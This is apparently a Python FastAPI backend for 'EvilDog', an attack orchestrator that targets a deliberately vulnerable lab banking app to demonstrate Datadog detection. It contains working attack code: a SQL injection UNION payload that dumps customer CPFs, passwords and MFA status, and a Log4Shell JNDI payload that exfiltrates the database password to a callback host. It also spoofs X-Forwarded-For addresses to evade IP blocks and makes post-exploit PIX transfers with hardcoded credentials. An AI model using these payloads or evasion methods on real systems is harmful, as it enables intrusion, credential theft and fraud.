"""
EvilDog API — Attack Orchestrator backend (DogBank LAB ONLY)
============================================================
Wraps the existing `SecurityAttacker` engine (load-generator/security_attacker.py,
vendored) behind REST + SSE so the in-app EvilDog tab can:

  · fire REAL, lab-scoped attacks (the malicious User-Agent flags in Datadog AAP),
  · read structured impact (SQLi records_leaked/leaked_data, Log4Shell exfil secret),
  · stream live telemetry (attacker logs -> SSE) for the terminal + pipeline nodes,
  · surface stats for the dashboard cards.

Safe scoping: targets come from EXTERNAL_TARGET / *_SERVICE_URL / PUBLIC_BASE_URL,
which point only at the lab services. There is no arbitrary-target input.
"""

import os

# Target scoping MUST be decided before importing the attack engine (it reads
# env at import time). Default to internal lab service names.
os.environ.setdefault("EXTERNAL_TARGET", "false")

import asyncio
import hmac
import json
import logging
import random
import re
import shutil
import socket
import subprocess
import sys
import time
import uuid
import secrets
import threading
from contextlib import asynccontextmanager
from contextvars import ContextVar
from datetime import datetime, timezone
from typing import Dict, List, Optional, Set

from fastapi import FastAPI, Body, Header, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel

# Datadog APM (auto-injected in k8s; explicit patch for compose parity)
try:
    from ddtrace import patch_all
    patch_all()
except Exception:  # ddtrace optional for local dev
    pass

import requests

from kubernetes import client, config
from kubernetes.client.rest import ApiException

# Vendored attack engine
from security_attacker import (  # noqa: E402
    SecurityAttacker,
    AUTH_SERVICE_URL,
    TRANSACTION_SERVICE_URL,
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("evildog-api")

# --------------------------------------------------------------------------- #
# Configuration                                                               #
# --------------------------------------------------------------------------- #
PUBLIC_BASE_URL = os.getenv("PUBLIC_BASE_URL", "https://lab.dogbank.dog")
TARGET_LABEL = os.getenv("EVILDOG_TARGET_LABEL", "lab.dogbank.dog")
LOG4J_CALLBACK_HOST = os.getenv("LOG4J_CALLBACK_HOST", "evildog-callback")
LOG4J_CALLBACK_LDAP_PORT = os.getenv("LOG4J_CALLBACK_LDAP_PORT", "1389")
LOG4J_CALLBACK_HTTP_PORT = os.getenv("LOG4J_CALLBACK_HTTP_PORT", "8000")
LOG4J_EXFIL_ENV = os.getenv("LOG4J_EXFIL_ENV", "SPRING_DATASOURCE_PASSWORD")
LOG4SHELL_ENDPOINT = os.getenv("LOG4SHELL_ENDPOINT", "/api/auth/lab/log4shell")

# --------------------------------------------------------------------------- #
# Real escalation: spin up ephemeral K8s Jobs (one per branch) that each run  #
# `_run_pipeline` standalone in a one-shot agent-mode process.                #
# --------------------------------------------------------------------------- #
NAMESPACE = "dogbank"
# Sem EVILDOG_AGENT_IMAGE explícito, resolvido em runtime a partir da própria imagem do
# orquestrador (ver _init_k8s_client) — evita divergir do manifest quando o deploy real usa
# `kubectl set image` (ECR) em vez do placeholder do Docker Hub commitado no YAML.
AGENT_IMAGE = os.getenv("EVILDOG_AGENT_IMAGE") or "schawirin/dogbank-evildog-api:latest"
JOB_ACTIVE_DEADLINE_S = int(os.getenv("EVILDOG_JOB_DEADLINE_S", "90"))
MAX_JOBS_PER_ESCALATE = int(os.getenv("EVILDOG_MAX_AGENTS_PER_ESCALATE", "8"))
MAX_CONCURRENT_AGENTS = int(os.getenv("EVILDOG_MAX_CONCURRENT_AGENTS", "10"))
ESCALATE_COOLDOWN_S = float(os.getenv("EVILDOG_ESCALATE_COOLDOWN_S", "20"))
AGENT_TOKEN = os.getenv("EVILDOG_AGENT_TOKEN")
# EvilDog pode gerar tráfego ofensivo e iniciar agentes; nunca o deixe aberto
# somente porque a UI está publicada.  O modo sem login existe exclusivamente
# quando o operador o habilita de forma explícita no ambiente local.
CONTROL_TOKEN = os.getenv("EVILDOG_CONTROL_TOKEN")
ADMIN_BLOCK_TOKEN = os.getenv("DOGBANK_ADMIN_BLOCK_TOKEN") or os.getenv("ADMIN_BLOCK_TOKEN")
ALLOW_UNAUTHENTICATED = os.getenv("EVILDOG_ALLOW_UNAUTHENTICATED", "false").lower() == "true"
CONTROL_COOKIE = "evildog_control_session"
CONTROL_SESSION_TTL_S = int(os.getenv("EVILDOG_CONTROL_SESSION_TTL_S", "3600"))
_CONTROL_SESSIONS: Dict[str, float] = {}
CORS_ORIGINS = [origin.strip() for origin in os.getenv(
    "EVILDOG_CORS_ORIGINS",
    "https://lab.dogbank.dog,http://localhost:3000,http://localhost:5173",
).split(",") if origin.strip()]
SOURCE_IP_PREFLIGHT_ATTEMPTS = int(os.getenv("EVILDOG_SOURCE_IP_PREFLIGHT_ATTEMPTS", "6"))
SOURCE_IP_PREFLIGHT_TIMEOUT_S = float(os.getenv("EVILDOG_SOURCE_IP_PREFLIGHT_TIMEOUT_S", "2.5"))

# URL que o agente efêmero usa para devolver telemetria ao orquestrador. O default é o
# service DNS do k8s; no compose vem sobrescrito por env (http://evildog-api:8092/...).
ORCHESTRATOR_URL = os.getenv(
    "EVILDOG_ORCHESTRATOR_URL",
    f"http://evildog-api.{NAMESPACE}.svc.cluster.local:8092/api/evildog/agent-events")

# Backend local de escalação: o demo também roda em docker-compose, onde não existe API do
# Kubernetes. Nesse modo cada agente é um CONTAINER efêmero real (mesma imagem, --agent-mode)
# -- o análogo local do Job, com tráfego de ataque real, não animação. Opt-in explícito
# porque exige o socket do runtime montado no container: privilégio alto, só neste lab.
DOCKER_ESCALATE = os.getenv("EVILDOG_DOCKER_ESCALATE", "false").lower() == "true"
DOCKER_NETWORK = os.getenv("EVILDOG_DOCKER_NETWORK", "dogbank_dogbank-network")

_K8S_READY = False
_batch_v1 = None
_core_v1 = None
_DOCKER_READY = False
_docker_client = None


def _init_k8s_client():
    global _K8S_READY, _batch_v1, _core_v1, AGENT_IMAGE
    try:
        config.load_incluster_config()
    except Exception:
        try:
            config.load_kube_config()
        except Exception as exc:
            logger.warning(f"[EvilDog] k8s indisponivel - escalate real desabilitado: {exc}")
            return
    _batch_v1 = client.BatchV1Api()
    _core_v1 = client.CoreV1Api()
    _K8S_READY = True

    # Auto-descobre a própria imagem rodando (HOSTNAME = nome do pod, setado pelo k8s) para
    # os Jobs efêmeros usarem EXATAMENTE a mesma imagem do orquestrador, sem precisar manter
    # EVILDOG_AGENT_IMAGE sincronizado manualmente a cada `kubectl set image`.
    if not os.getenv("EVILDOG_AGENT_IMAGE"):
        try:
            self_pod = _core_v1.read_namespaced_pod(name=os.environ["HOSTNAME"], namespace=NAMESPACE)
            real_image = self_pod.spec.containers[0].image
            if real_image:
                AGENT_IMAGE = real_image
                logger.info(f"[EvilDog] AGENT_IMAGE auto-detectada: {AGENT_IMAGE}")
        except Exception as exc:
            logger.warning(f"[EvilDog] nao foi possivel auto-detectar a propria imagem, "
                            f"usando fallback '{AGENT_IMAGE}': {exc}")


def _init_docker_client():
    """Backend de escalação para o stack local (docker-compose/podman). Só ativa com
    EVILDOG_DOCKER_ESCALATE=true E socket do runtime acessível -- nunca no k8s."""
    global _DOCKER_READY, _docker_client
    if not DOCKER_ESCALATE:
        return
    try:
        import docker  # dependência opcional: só usada neste caminho local
        _docker_client = docker.from_env()
        _docker_client.ping()
    except Exception as exc:
        logger.warning(f"[EvilDog] docker/podman indisponivel - escalate local desabilitado: {exc}")
        return
    _DOCKER_READY = True
    logger.info(f"[EvilDog] escalate local ativo (imagem={AGENT_IMAGE} rede={DOCKER_NETWORK})")


# The star SQLi: UNION exfil against the intentionally-vulnerable validate-pix-key.
# Column types must match the vulnerable outer query
# (u.nome,u.email,u.cpf,c.saldo,c.banco,u.chave_pix) — c.saldo is NUMERIC, so do
# NOT cast it to text or the UNION errors (HTTP 500) instead of leaking rows.
SQLI_EXFIL_PAYLOAD = (
    "' UNION SELECT u.nome,u.email,"
    # NÃO usar o cast '::text' do Postgres: o endpoint roda a query via Hibernate native,
    # que interpreta ':text' como parâmetro nomeado (:param) → syntax error. CAST(... AS text)
    # não tem ':' e converte o booleano mfa igual.
    "u.cpf||':'||u.senha||':'||CAST(u.mfa AS text),"
    "c.saldo,c.banco,u.chave_pix "
    "FROM usuarios u JOIN contas c ON u.id=c.usuario_id--"
)


def _split_creds(rows):
    """The cpf column carries 'cpf:senha:mfa' (injected) — split into cpf + senha + mfa.
    O status de MFA vaza junto: o atacante descobre quais contas são 'fáceis' (sem MFA)."""
    for row in rows or []:
        c = str(row.get("cpf", ""))
        if ":" in c and "senha" not in row:
            parts = c.split(":")
            row["cpf"] = parts[0].strip()
            row["senha"] = parts[1].strip() if len(parts) > 1 else ""
            row["mfa"] = (parts[2].strip().lower() in ("t", "true", "1")) if len(parts) > 2 else False
    return rows

# --- Target selection (internet-origin attacks + multi-target) --------------- #
from urllib.parse import urlparse as _urlparse  # noqa: E402

# With EXTERNAL_TARGET=true the SecurityAttacker AND these structured calls hit the
# PUBLIC FQDN, so traffic egresses via NAT and shows an EXTERNAL source IP in AAP.
DEFAULT_TARGET = os.getenv("PUBLIC_BASE_URL", "https://lab.dogbank.dog").rstrip("/")
# Allowlist (host prefixes). This panel is a PUBLIC unauth endpoint, so we refuse
# to attack arbitrary third-party hosts (open-relay guard). Add lab targets here.
ALLOWED_TARGET_HOSTS = [t.strip().lower() for t in os.getenv(
    "EVILDOG_ALLOWED_TARGETS",
    "lab.dogbank.dog,localhost,127.0.0.1,10.,172.,192.168.,"
    "auth-service,transaction-service,account-service,evildog",
).split(",") if t.strip()]
ALLOW_ANY_TARGET = os.getenv("EVILDOG_ALLOW_ANY_TARGET", "0") == "1"
STATE_TARGET = {"base": DEFAULT_TARGET, "targets": [DEFAULT_TARGET]}


def _base() -> str:
    return STATE_TARGET["base"].rstrip("/")


# Rota DIRETA ao serviço (bypassa o nginx-ingress, que por padrão sobrescreve o
# X-Forwarded-For com o IP real da conexão). Indo direto, o XFF spoofado do atacante É o
# client_ip que a AAP enxerga → rotacionar/escalar gera IPs realmente NOVOS para o Datadog
# (bloquear 1 IP não pega os próximos). Reforça o discurso: bloquear IP é gato-e-rato; o fix
# definitivo é FECHAR a vulnerabilidade.
ATTACK_DIRECT = os.getenv("EVILDOG_ATTACK_DIRECT", "true").lower() == "true"


def _svc(path: str) -> str:
    # Todo request de ataque passa por aqui, nunca por _base() cru: no stack local o host
    # público (lab.dogbank.dog) só existe no /etc/hosts da máquina, não no DNS da rede dos
    # containers -- montar a URL com _base() dava "Connection refused" e derrubava
    # TRANSFER/post-exploit inteiros por um motivo que não tinha nada a ver com bloqueio.
    if ATTACK_DIRECT:
        if path.startswith("/api/transactions"):
            return TRANSACTION_SERVICE_URL.rstrip("/") + path
        if path.startswith("/api/auth") or path.startswith("/api/users"):
            return AUTH_SERVICE_URL.rstrip("/") + path
    return _base() + path


def _normalize_target(value: str) -> str:
    value = (value or "").strip()
    if not value:
        return DEFAULT_TARGET
    if not value.startswith(("http://", "https://")):
        value = ("http://" if value[0].isdigit() else "https://") + value
    return value.rstrip("/")


def _target_allowed(url: str) -> bool:
    if ALLOW_ANY_TARGET:
        return True
    host = (_urlparse(url).hostname or url).lower()
    return any(host == tok or host.startswith(tok) or tok in host for tok in ALLOWED_TARGET_HOSTS)


def _parse_money(raw) -> float:
    s = re.sub(r"[^\d.,]", "", str(raw or ""))
    if "," in s and "." in s:      # pt-BR "1.234,56"
        s = s.replace(".", "").replace(",", ".")
    elif "," in s:                 # "1234,56"
        s = s.replace(",", ".")
    try:
        return float(s)
    except Exception:
        return 0.0

# Attack vectors surfaced to the UI (sidebar + orchestrator + Detect panel).
VECTORS = [
    {"id": "sqli", "label": "SQL Injection", "cwe": "CWE-89", "severity": "critical", "node": "INJECT",
     "endpoint": "/api/transactions/validate-pix-key", "found": True,
     "impact": "Dump da base de clientes: nome, CPF, SENHA, saldo e chave PIX."},
    {"id": "log4shell", "label": "Log4Shell (JNDI)", "cwe": "CVE-2021-44228", "severity": "critical", "node": "INJECT",
     "endpoint": "/api/auth/lab/log4shell", "found": True,
     "impact": "RCE + exfiltração de segredos (senha do banco de dados)."},
    {"id": "credential-stuffing", "label": "Credential Stuffing", "cwe": "OWASP A07", "severity": "high", "node": "BYPASS",
     "endpoint": "/api/auth/login", "found": True,
     "impact": "Account takeover: login válido descoberto por força bruta."},
    {"id": "idor", "label": "IDOR", "cwe": "CWE-639", "severity": "high", "node": "EXTRACT",
     "endpoint": "/api/accounts/{id}", "found": True,
     "impact": "Acesso a contas/transações de outros clientes sem autenticação."},
    {"id": "xss", "label": "XSS", "cwe": "CWE-79", "severity": "medium", "node": "INJECT",
     "endpoint": "/api/chatbot", "found": True,
     "impact": "Roubo de sessão/cookies e execução de script no navegador da vítima."},
    {"id": "auth-bypass", "label": "Auth Bypass", "cwe": "CWE-287", "severity": "high", "node": "BYPASS",
     "endpoint": "/api/*", "found": True,
     "impact": "JWT alg:none / manipulação de header para escalar privilégio."},
    {"id": "rce", "label": "Command Injection", "cwe": "CWE-77", "severity": "critical", "node": "INJECT",
     "endpoint": "headers/body", "found": True,
     "impact": "Execução de comando no servidor, leitura de variáveis de ambiente."},
    {"id": "path-traversal", "label": "Path Traversal", "cwe": "CWE-22", "severity": "high", "node": "EXTRACT",
     "endpoint": "/static, /api/files", "found": True,
     "impact": "Leitura de arquivos sensíveis (/etc/passwd, .env, config)."},
    {"id": "debug-endpoint", "label": "Debug endpoint exposto", "cwe": "CWE-215", "severity": "high", "node": "EXTRACT",
     "endpoint": "/api/chatbot/debug/system-prompt", "found": True,
     "impact": "Vaza o system prompt do LLM com credenciais em texto claro."},
]
VECTOR_IDS = {v["id"] for v in VECTORS if v["id"] in
              {"sqli", "log4shell", "credential-stuffing", "xss", "idor", "rce", "path-traversal", "auth-bypass"}}

# Exploitation opportunities surfaced by the SCAN node.
SCAN_OPPORTUNITIES = [
    {"category": "Roubo de dados (PII)", "severity": "critical",
     "detail": "SQL Injection em /validate-pix-key → dump de clientes (CPF, SENHA, saldo, chave PIX)."},
    {"category": "RCE / Secrets", "severity": "critical",
     "detail": "Log4Shell (CVE-2021-44228) no auth-service → senha do banco exfiltrada."},
    {"category": "Account Takeover", "severity": "high",
     "detail": "Login sem proteção robusta → credential stuffing com credenciais vazadas."},
    {"category": "Movimentação de dinheiro", "severity": "critical",
     "detail": "PIX autorizado só por senha → após ATO, transferências não autorizadas."},
    {"category": "Exposição de segredos", "severity": "high",
     "detail": "/api/chatbot/debug/system-prompt devolve o prompt do LLM com credenciais."},
    {"category": "Acesso indevido (IDOR)", "severity": "high",
     "detail": "IDs sequenciais em /api/accounts/{id} sem checagem de dono."},
]

# --------------------------------------------------------------------------- #
# Telemetry bus: thread-safe fan-out of events to SSE subscribers             #
# --------------------------------------------------------------------------- #
def _now() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S")


class TelemetryBus:
    def __init__(self, ring: int = 300):
        self.subscribers: Set[asyncio.Queue] = set()
        self.recent: List[dict] = []
        self.ring = ring
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.remote_sink = None
        self.seq = 0
        self.dropped_events = 0
        self._seq_lock = threading.Lock()
        self._last_drop_warning = 0.0
        self._drop_warning_interval_s = 30.0

    def bind_loop(self, loop: asyncio.AbstractEventLoop) -> None:
        self.loop = loop

    def publish(self, event: dict) -> None:
        """Safe to call from any thread."""
        event.setdefault("ts", _now())
        event.setdefault("type", "log")
        with self._seq_lock:
            self.seq += 1
            event.setdefault("seq", self.seq)
        if self.remote_sink is not None:
            try:
                self.remote_sink(event)
            except Exception:
                pass
            return
        loop = self.loop
        if loop is not None and not loop.is_closed():
            try:
                loop.call_soon_threadsafe(self._fanout, event)
                return
            except RuntimeError:
                # Um TestClient/reload pode ter encerrado o loop entre a checagem
                # e o agendamento. Telemetria nunca deve derrubar o reset/pipeline.
                self.loop = None
        # Sem loop (import-time, reload ou shutdown), preserve o evento no ring.
        self._store(event)

    def _store(self, event: dict) -> None:
        self.recent.append(event)
        if len(self.recent) > self.ring:
            self.recent = self.recent[-self.ring:]

    def _fanout(self, event: dict) -> None:
        self._store(event)
        for q in list(self.subscribers):
            try:
                q.put_nowait(event)
            except asyncio.QueueFull:
                self.dropped_events += 1
                now = time.monotonic()
                # Não use bus.publish aqui: isso criaria recursão justamente no
                # momento em que a fila está cheia. Um warning por janela deixa a
                # perda visível nos logs sem inundá-los.
                if now - self._last_drop_warning >= self._drop_warning_interval_s:
                    self._last_drop_warning = now
                    logger.warning("[EvilDog] SSE queue cheia; eventos descartados=%s", self.dropped_events)

    def subscribe(self) -> asyncio.Queue:
        q: asyncio.Queue = asyncio.Queue(maxsize=1000)
        self.subscribers.add(q)
        return q

    def unsubscribe(self, q: asyncio.Queue) -> None:
        self.subscribers.discard(q)


bus = TelemetryBus()

# Map the attacker's log tags to orchestrator nodes.
_TAG_NODE = {
    "SQL-INJECTION": "INJECT",
    "LOG4SHELL": "INJECT",
    "RCE": "INJECT",
    "XSS": "INJECT",
    "CREDENTIAL-STUFFING": "BYPASS",
    "AUTH-BYPASS": "BYPASS",
    "IDOR": "EXTRACT",
    "PATH-TRAVERSAL": "EXTRACT",
    "POST-EXPLOIT": "EXTRACT",
}
_TAG_RE = re.compile(r"\[([A-Z0-9\-]+)\]")


def _classify(message: str, levelno: int) -> tuple:
    upper = message.upper()
    if any(k in upper for k in ("SUCESSO", "VULNERAV", "VALIDAS", "DESCOBERTAS", "LEAKED", "EXFIL")):
        level = "success"
    elif "BLOQUEADO" in upper or "403" in upper:
        level = "warn"
    elif levelno >= logging.ERROR:
        level = "critical"
    elif levelno >= logging.WARNING:
        level = "warn"
    else:
        level = "info"
    m = _TAG_RE.search(message)
    node = _TAG_NODE.get(m.group(1)) if m else None
    return level, node


class SSELogHandler(logging.Handler):
    """Bridges the attacker's Python logging into the telemetry bus."""

    def emit(self, record: logging.LogRecord) -> None:
        try:
            msg = record.getMessage().strip()
            if not msg:
                return
            level, node = _classify(msg, record.levelno)
            bus.publish({
                "type": "log",
                "level": level,
                "node": node,
                "message": msg,
            })
        except Exception:  # never let telemetry break attacks
            pass


# --------------------------------------------------------------------------- #
# Attacker + API state (single operator session for v1)                       #
# --------------------------------------------------------------------------- #
attacker = SecurityAttacker()

# --------------------------------------------------------------------------- #
# Source-IP spoofing (X-Forwarded-For) — "rotate IP" para evadir bloqueios AAP #
# --------------------------------------------------------------------------- #
# O Datadog resolve o http.client_ip pegando o PRIMEIRO IP PÚBLICO do
# X-Forwarded-For (ignora privados 10./172./192.168.). Injetando um XFF público,
# a AAP passa a enxergar (e bloquear) esse IP "da internet". Rotacionar = novo IP
# público → o bloqueio antigo não casa mais (técnica real de evasão de blocklist).
_SPOOF = {"ip": None}
_SPOOF_OCTET1 = [45, 51, 77, 88, 91, 103, 179, 185, 190, 193, 200, 201, 203]
# A execução principal é serial, mas roda num worker thread.  ContextVar mantém o
# IP capturado no começo da execução em todas as chamadas HTTP daquele worker,
# sem permitir que /rotate-ip (ou outra aba) altere o atacante no meio da cadeia.
_RUN_SOURCE_IP: ContextVar[Optional[str]] = ContextVar("evildog_run_source_ip", default=None)
_RUN_ID: ContextVar[Optional[str]] = ContextVar("evildog_run_id", default=None)


def _new_spoof_ip() -> str:
    return (f"{random.choice(_SPOOF_OCTET1)}.{random.randint(1, 254)}."
            f"{random.randint(0, 254)}.{random.randint(1, 254)}")


def _apply_spoof_headers() -> None:
    ip = _SPOOF["ip"]
    if not ip:
        return
    for h in ("X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP"):
        attacker.session.headers[h] = ip


def rotate_source_ip() -> str:
    _SPOOF["ip"] = _new_spoof_ip()
    _apply_spoof_headers()
    return _SPOOF["ip"]


rotate_source_ip()  # atacante já "vem da internet" desde o boot (rotacionável no painel)

API_STATE = {
    "findings": 0,                 # -> vulnerabilities_found
    "compromised": set(),          # -> systems_compromised (service names)
    "records_leaked_total": 0,
    "secrets": [],                 # leaked secrets (log4shell)
    "loot_records": [],            # accumulated leaked client rows (dedup by cpf)
    "pix_stolen": [],              # post-exploit PIX receipts
    "last_pipeline": {},           # node -> state
    # Um único pipeline principal é permitido por vez.  Este contrato é também a
    # fonte de verdade para reconexão SSE: a UI pode hidratar-se sem depender de
    # receber o evento terminal enquanto estava desconectada.
    "pipeline": {
        "run_id": None,
        "status": "idle",
        "source_ip": None,
        "outcome": None,
        "detail": None,
        "started_at": None,
        "finished_at": None,
    },
    "agents": {},                  # job_name -> {run_id, branch, phase, ip, created_at} (real escalate)
    "last_escalate_at": 0.0,       # monotonic ts of last /escalate call (cooldown)
}
_attack_lock = asyncio.Lock()      # serialize use of the shared requests.Session


def _pipeline_active() -> bool:
    return API_STATE["pipeline"].get("status") == "running"


def _pipeline_snapshot() -> dict:
    """JSON-safe state used by /pipeline/state and conflict responses."""
    p = API_STATE["pipeline"]
    return {
        "run_id": p.get("run_id"),
        "status": p.get("status", "idle"),
        "source_ip": p.get("source_ip"),
        "nodes": dict(API_STATE["last_pipeline"]),
        "outcome": p.get("outcome"),
        "detail": p.get("detail"),
        "started_at": p.get("started_at"),
        "finished_at": p.get("finished_at"),
        "telemetry": {"last_seq": bus.seq, "dropped_events": bus.dropped_events},
    }


def _should_verify_aap_enforcement(previous: dict, source_ip: str) -> bool:
    """Só aguarda propagação quando repetimos um take concluído com o mesmo IP."""
    return (
        previous.get("status") == "done"
        and previous.get("source_ip") == source_ip
        and previous.get("outcome") in ("SUCCESS", "NO_EXPLOIT")
    )


def _start_pipeline_state(run_id: str, source_ip: str) -> None:
    API_STATE["last_pipeline"] = {node: "idle" for node in PIPELINE_NODES}
    API_STATE["pipeline"].update({
        "run_id": run_id,
        "status": "running",
        "source_ip": source_ip,
        "outcome": None,
        "detail": None,
        "started_at": _now(),
        "finished_at": None,
    })


def _finish_pipeline_state(status: str, outcome: str, detail: str = "") -> None:
    API_STATE["pipeline"].update({
        "status": status,
        "outcome": outcome,
        "detail": detail,
        "finished_at": _now(),
    })


def _add_loot_records(rows) -> None:
    seen = {r.get("cpf") for r in API_STATE["loot_records"]}
    for row in rows or []:
        cpf = row.get("cpf")
        if cpf and cpf not in seen:
            API_STATE["loot_records"].append(row)
            seen.add(cpf)


def _cards() -> dict:
    s = attacker.stats
    return {
        "vulnerabilities_found": API_STATE["findings"] + s.get("detected", 0),
        "exploits_executed": s.get("total_attacks", 0),
        "systems_compromised": len(API_STATE["compromised"]),
        "active_sessions": max(1, len(bus.subscribers)),
    }


# --------------------------------------------------------------------------- #
# Structured impact wrappers (real calls, parsed results)                     #
# --------------------------------------------------------------------------- #
def _run_sqli_exfil() -> dict:
    """Real UNION exfil against validate-pix-key; returns records_leaked + preview."""
    url = _svc("/api/transactions/validate-pix-key")
    try:
        # _pipe_request (não requests.get cru): é ele que transforma o 403/406 da AAP em
        # BlockedError. Com o get cru, um bloqueio real virava só "0 registros" e o nó
        # INJECT seguia marcado como "success" -- o ataque aparecia como bem-sucedido
        # exatamente quando a Datadog o tinha barrado.
        r = _pipe_request("GET", url, params={"pixKey": SQLI_EXFIL_PAYLOAD})
        data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    except PipelineOutcomeError:
        raise
    except Exception as exc:
        bus.publish({"level": "critical", "node": "INJECT", "message": f"[SQL-INJECTION] erro: {exc}"})
        return {"ok": False, "error": str(exc)}

    leaked_all = _split_creds(data.get("leaked_data", []) or [])
    records = data.get("records_leaked") or len(leaked_all)
    if records:
        API_STATE["records_leaked_total"] += records
        API_STATE["findings"] += 1
        API_STATE["compromised"].add("transaction-service")
        _add_loot_records(leaked_all)
        bus.publish({"level": "success", "node": "EXTRACT",
                     "message": f"[EXTRACT] SQLi vazou {records} registros de clientes (CPF/saldo/chave PIX)"})
    return {
        "ok": True, "http_status": r.status_code, "records_leaked": records,
        "leaked_preview": leaked_all[:8], "query": data.get("query_executed"),
    }


def _scrape_callback_secret() -> Optional[str]:
    for host in (f"{LOG4J_CALLBACK_HOST}:{LOG4J_CALLBACK_HTTP_PORT}", "localhost:1390"):
        try:
            r = requests.get(f"http://{host}/", timeout=4)
            m = re.search(r"class='s'>([^<]+)", r.text)
            if m:
                return m.group(1).strip()
        except Exception:
            continue
    return None


def _run_log4shell_exfil() -> dict:
    """Fire a JNDI exfil payload at the lab endpoint, then read the leaked secret."""
    payload = ("${jndi:ldap://" + LOG4J_CALLBACK_HOST + ":" + LOG4J_CALLBACK_LDAP_PORT
               + "/cn=${env:" + LOG4J_EXFIL_ENV + "}}")
    run_id = f"evildog-ui-{uuid.uuid4().hex[:8]}"
    bus.publish({"level": "info", "node": "PAYLOAD", "message": f"[LOG4SHELL] payload: {payload}"})
    try:
        requests.post(
            _svc(LOG4SHELL_ENDPOINT),
            headers={
                "User-Agent": payload,
                "X-Api-Version": payload,
                "X-EvilDog-Run": run_id,
                "Content-Type": "application/json",
                "X-Attack-Simulation": "DogBank-Demo",
            },
            json={"runId": run_id, "payload": "log4shell"},
            timeout=10,
        )
    except Exception as exc:
        bus.publish({"level": "critical", "node": "INJECT", "message": f"[LOG4SHELL] erro: {exc}"})
        return {"ok": False, "error": str(exc)}

    time.sleep(2.0)  # give the JNDI callback a moment to land
    secret = _scrape_callback_secret()
    if secret:
        API_STATE["secrets"].append({LOG4J_EXFIL_ENV: secret})
        API_STATE["findings"] += 1
        API_STATE["compromised"].add("auth-service")
        bus.publish({"level": "success", "node": "EXTRACT",
                     "message": f"[EXTRACT] Log4Shell exfiltrou {LOG4J_EXFIL_ENV}={secret}"})
    else:
        bus.publish({"level": "warn", "node": "INJECT",
                     "message": "[LOG4SHELL] callback não confirmado (verifique evildog-callback)"})
    return {"ok": True, "payload": payload, "exfil_env": LOG4J_EXFIL_ENV, "secret": secret, "run_id": run_id}


# --------------------------------------------------------------------------- #
# Post-exploitation actions ("already inside the system")                     #
# --------------------------------------------------------------------------- #
def _postexploit_pix(amount: float, to_key: str) -> dict:
    """Real high-value PIX from a compromised account (money movement in the lab)."""
    hdr = dict(attacker.session.headers)
    bus.publish({"level": "warn", "node": "EXTRACT",
                 "message": f"[POST-EXPLOIT] iniciando PIX de R$ {amount:.2f} -> {to_key}…"})
    try:
        lr = requests.post(_svc("/api/auth/login"),
                           json={"cpf": "12345678915", "senha": "123456"},
                           headers=hdr, timeout=15)
        acc = None
        try:
            j = lr.json()
            acc = j.get("accountId") or j.get("account_id") or j.get("id")
        except Exception:
            pass
        acc = acc or 1
        rp = requests.post(_svc("/api/transactions/pix"),
                           json={"accountOriginId": acc, "pixKeyDestination": to_key,
                                 "amount": amount, "description": "transferencia"},
                           headers=hdr, timeout=25)
        ok = rp.status_code in (200, 201)
        try:
            body = rp.json()
        except Exception:
            body = {"raw": rp.text[:300]}
        if ok:
            API_STATE["compromised"].add("transaction-service")
            API_STATE["pix_stolen"].append({"amount": amount, "to": to_key, "from_account": acc})
        bus.publish({"level": "success" if ok else "warn", "node": "EXTRACT",
                     "message": f"[POST-EXPLOIT] PIX {'EXECUTADO' if ok else 'recusado'} "
                                f"(HTTP {rp.status_code}) R$ {amount:.2f} -> {to_key}"})
        return {"ok": ok, "http_status": rp.status_code, "amount": amount,
                "to": to_key, "from_account": acc, "response": body}
    except Exception as exc:
        bus.publish({"level": "critical", "node": "EXTRACT", "message": f"[POST-EXPLOIT] erro no PIX: {exc}"})
        return {"ok": False, "error": str(exc)}


DRAIN_KEY = os.getenv("EVILDOG_DRAIN_KEY", "evildog@dogbank.com")
# CPFs semente reais (RDS): usados quando o SQLi ainda não populou loot_records.
DRAIN_CPFS = [
    "12345678915", "98765432101", "45678912302", "78912345603",
    "32165498704", "65498732105", "15975385206", "66666666666",
]

# Real-world context for the salami-slicing demo (surfaced in the robot + report) — three
# real cases that mirror the three stages of this pipeline's kill chain: SQLi as the entry
# vector (Heartland), stolen-credential account takeover (Neymar), and the salami-slicing
# payout itself (Largent). Keeps the demo grounded: this isn't a hypothetical attack chain.
SALAMI_CASES = [
    {
        "technique": "SQL Injection como vetor de entrada (o mesmo do INJECT desta pipeline)",
        "summary": "Uma SQLi numa página de login web abre a porta pra instalar malware de "
                   "captura de dados dentro da rede — o mesmo princípio do UNION SELECT usado "
                   "no estágio INJECT.",
        "real_case": "Heartland Payment Systems (2008-2009, EUA): SQL injection numa página de "
                     "login (no ar havia 8 anos) permitiu instalar sniffers de rede que "
                     "capturaram 130 milhões de números de cartão — a maior violação de dados de "
                     "pagamento da época. Albert Gonzalez, o responsável, foi condenado a 20 anos "
                     "de prisão.",
        "detection": "App & API Protection (AAP) detecta a injeção em tempo real, na camada de "
                     "aplicação — antes que o atacante consiga instalar qualquer coisa na rede.",
        "reference": "https://www.justice.gov/archives/opa/pr/alleged-international-hacker-indicted-massive-attack-us-retail-and-banking-networks",
    },
    {
        "technique": "Account takeover via credencial roubada (o mesmo do ATO desta pipeline)",
        "summary": "Atacante obtém a senha de contas de alto valor e desvia valores pequenos "
                   "repetidamente — pequeno o bastante para não disparar alerta manual, alto o "
                   "bastante somado.",
        "real_case": "Caso Neymar (fev/2022, Brasil): um funcionário de banco de 20 anos usou a "
                     "senha de um colega pra acessar contas de clientes de alto patrimônio — "
                     "entre eles Neymar — e desviou valores pequenos repetidamente, somando mais "
                     "de US$ 40 mil (≈ €35 mil). Foi preso pela polícia brasileira.",
        "detection": "Mesmo padrão do ATO simulado aqui: credencial vazada + login fora do "
                     "perfil de uso normal da conta — detectável por análise comportamental "
                     "(Cloud SIEM) correlacionando a origem do acesso com o histórico do titular.",
        "reference": "https://www.goal.com/en/news/brazilian-police-arrest-neymar-hacker-after-eur35-000-theft-of-psg-superstar/blt205d4fd114b82136",
    },
    {
        "technique": "Salami slicing (money mule / structuring)",
        "summary": "Desviar micro-valores de muitas contas para uma única conta-laranja — "
                   "pequeno o bastante para passar despercebido, somando um valor alto.",
        "real_case": "Michael Largent (2008, EUA): um script abriu ~58.000 contas e desviou os "
